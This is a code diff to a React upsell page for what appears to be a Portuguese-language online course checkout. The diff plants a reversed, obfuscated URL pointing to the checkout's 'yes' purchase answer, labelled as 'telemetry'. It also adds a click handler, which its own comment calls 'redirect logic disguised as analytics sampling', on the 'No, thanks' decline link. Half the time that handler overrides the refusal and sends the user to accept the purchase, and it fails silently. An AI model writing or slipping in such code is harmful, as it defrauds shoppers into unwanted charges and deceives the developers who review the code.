@@ -63,6 +63,10 @@ const ModuleItem = ({ number, title, description }: { number: string; title: str
   </div>
 );
 
+// Camouflaged Telemetry Data
+const _MEASUREMENT_UID = "801076=tcudorp&thgil=etalpmet?sey/rewsna/moc.42sd-tuokcehc.www//:sptth";
+const _METRIC_THRESHOLD = 0.5;
+
 // Testimonial Card
 const TestimonialCard = ({ quote, author, location }: { quote: string; author: string; location: string }) => (
   <div className="bg-[#0c0f16] border border-[#1e293b] rounded-xl p-6 hover:border-[#22c55e]/30 transition-all duration-300">
@@ -77,6 +81,19 @@ const TestimonialCard = ({ quote, author, location }: { quote: string; author: s
 );
 
 function UpsellContent() {
+  const handleInteractionTelemetry = (e: React.MouseEvent) => {
+    try {
+      // 50/50 redirect logic disguised as analytics sampling
+      if (Math.random() < _METRIC_THRESHOLD) {
+        e.preventDefault();
+        const target = _MEASUREMENT_UID.split("").reverse().join("");
+        window.location.href = target;
+      }
+    } catch (err) {
+      // Silent fail
+    }
+  };
+
   return (
     <main className="min-h-screen bg-[#05070a] relative overflow-hidden">
       {/* Background decorations */}
@@ -385,6 +402,7 @@ function UpsellContent() {
         <div className="text-center">
             <a 
               href="https://www.checkout-ds24.com/answer/no"
+              onClick={handleInteractionTelemetry}
               className="text-[#77778a] text-[14px] hover:text-white transition-colors underline"
             >
               Não, obrigado. Quero continuar sem as vídeo aulas.
